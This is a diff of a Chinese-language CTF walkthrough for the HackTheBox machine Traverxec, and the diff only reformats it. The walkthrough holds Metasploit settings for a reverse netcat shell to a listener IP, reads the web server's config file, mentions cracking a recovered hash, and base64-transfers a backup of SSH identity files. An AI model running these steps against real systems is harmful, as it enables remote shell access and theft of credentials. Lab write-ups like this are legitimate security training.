@@ -27,11 +27,12 @@ use 0
 info
 ```
 
-![](./img/Traverxec-02.png)![](./img/Traverxec-03.png)
+![](./img/Traverxec-02.png)
+![](./img/Traverxec-03.png)
 
 ```
 set rhosts 10.10.10.165
-set payload cmd/unix/reverse_netcat_gaping	 # 建议
+set payload cmd/unix/reverse_netcat_gaping	 #建议
 set lhost 10.10.15.145
 set lport 4444
 run
@@ -45,10 +46,10 @@ cd /var/nostromo/conf
 cat nhttpd.conf
 ```
 
-![](./img/Traverxec-05.png)![](./img/Traverxec-06.png)
+![](./img/Traverxec-05.png)
+![](./img/Traverxec-06.png)
 
 >**拿到的密文放到服务器去跑，半天没出来。。。**
->
 >**上面并没有发现public_www目录，怀疑在david中**
 
 ```
@@ -60,9 +61,9 @@ ls -la
 ![](./img/Traverxec-07.png)
 
 ```
-base64 backup-ssh-identity-files.tgz 			  		#通过base64传输文件
-vim 64											  		#写入64文件
-cat 64 | base64 -d > backup-ssh-identity-files.tgz		#解码输出
+base64 backup-ssh-identity-files.tgz                    #通过base64传输文件
+vim 64                                                  #写入64文件
+cat 64 | base64 -d > backup-ssh-identity-files.tgz      #解码输出
 tar -zxvf backup-ssh-idntity-files.tgz
 ```
 
